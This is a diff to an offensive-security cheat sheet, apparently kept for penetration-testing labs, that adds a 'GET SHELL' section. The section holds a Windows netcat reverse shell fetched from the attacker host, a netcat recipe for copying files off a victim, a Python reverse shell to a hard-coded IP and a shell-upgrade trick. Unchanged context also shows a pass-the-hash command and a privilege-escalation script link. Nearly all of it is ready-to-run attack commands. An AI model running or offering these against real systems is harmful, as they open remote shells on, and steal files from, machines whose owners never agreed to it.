@@ -1,4 +1,4 @@
-# General
+# GENERAL
 ## Kali Configuration
 ```bash
 ## set keyboard layout
@@ -27,7 +27,7 @@ dir /R
 # output alternate datastreams
 powershell Get-Content -Path "hm.txt" -Stream "root.txt"
 ```
-# Privesc
+# PRIVESC
 ## LinEnum.sh
 https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 
@@ -46,4 +46,34 @@ root
 ## Pass-the-Hash spawn CMD
 ```bash
 pth-winexe -U$domain/$username%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //$ip cmd
+```
+
+# GET SHELL
+## Netcat Windows
+```bash
+powershell wget "http://[KALI-IP]/windows-resources/binaries/nc.exe" -outfile nc.exe
+nc.exe -e cmd.exe [KALI-IP] 1234
+
+#on Kali listen with
+nc -nvlp 1234
+```
+
+## Transfer Files
+```bash
+# listen on kali with
+nc -lp 1235 > [FILENAME]
+
+# transfer file on victim
+nc.exe -w 3 [KALI-IP] 1235 <[FILENAME]
+```
+
+## Python
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
+```
+```bash
+# make shell better
+python -c 'import pty; pty.spawn("/bin/bash");' 
+#on Kali listen with
+nc -nvlp 1234
 ```
